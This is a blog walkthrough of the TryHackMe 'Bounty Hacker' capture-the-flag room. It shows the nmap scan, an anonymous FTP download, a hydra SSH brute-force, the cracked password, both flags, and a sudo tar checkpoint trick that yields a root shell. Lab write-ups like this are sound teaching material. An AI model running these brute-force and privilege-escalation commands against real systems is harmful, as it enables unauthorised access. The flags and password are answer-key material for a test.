---
title: "Challenges: Bounty Hacker (TryHackMe)"
datePublished: Sat Jun 28 2025 13:21:50 GMT+0000 (Coordinated Universal Time)
cuid: cmcg9sncy000102jyhkeagkpb
slug: challenges-bounty-hacker-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1751116567242/7b28d162-41e1-45d3-9454-f891d56d1d1c.png
tags: tryhackme, ctf-writeup, bountyhunter, linux-privesc

---

You were boasting in a bar about your elite hacking skills, and a few Bounty Hunters decided to take you up on your claims. Now, it's time to prove your worth. Your mission: break into a target system, collect user and root flags, and walk away with your reputation intact (and maybe some bell peppers & beef for the road). Let’s get started.

## Living up to the title.

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

### Answer the questions below

1. Deploy the machine.
    
2. Find open ports on the machine  
      
    `nmap -sV <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115266258/5fb563c8-3e8f-40e5-bb85-6f19017b6e61.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115329074/d69b903d-0cfa-486f-a546-e7eb79f23091.png align="center")
    
3. Who wrote the task list? `lin`  
      
    ftp `<IP_Address>`
    
    Name: anonymous
    
    ftp&gt; `ls`
    
    ftp&gt; `get task.txt`
    
    FTP&gt; `get locks.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115429152/8224fafc-daa4-471e-8626-fbba1132e8b9.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115491212/8242a01d-4c0b-43b4-b201-4efbd720e6df.png align="center")
    
4. What service can you bruteforce with the text file found? `SSH`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115473861/15ecc8f6-3230-44a2-8695-756a7e45c15c.png align="center")
    
5. What is the users password? `RedDr4gonSynd1cat3`  
      
    `cat locks.txt`  
    `hydra -l lin -P locks.txt -t 4 ssh`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115597433/00b051ad-9401-4d6d-80db-26e270152270.png align="center")
    
6. user.txt `THM{CR1M3_SyNd1C4T3}`  
      
    `ssh lin@<IP_Address>`
    
    password:  
    `cat user.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115733764/8b71a310-f3be-4f16-8770-cb0c0c3ecd65.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115669490/d33fab02-3ae5-4631-ae02-826fd1480b65.png align="center")
    
7. root.txt `THM{80UN7Y_h4cK3r}`  
      
    `sudo -l`  
      
    `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
    
      
    `find / -type f -name root.txt 2> /dev/null`  
      
    `cat /root/root.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751115811719/28ee604a-58f6-4a77-a1a5-16303e10f282.png align="center")
    

You walked into the bar with confidence and left with proof: you are the real deal. With sharp recon, skilled brute-forcing, and clever privilege escalation, you conquered the BountyHacker challenge. No more boasting necessary—your flags speak for themselves. Enjoy your bell peppers and beef, hacker. 🍽️💻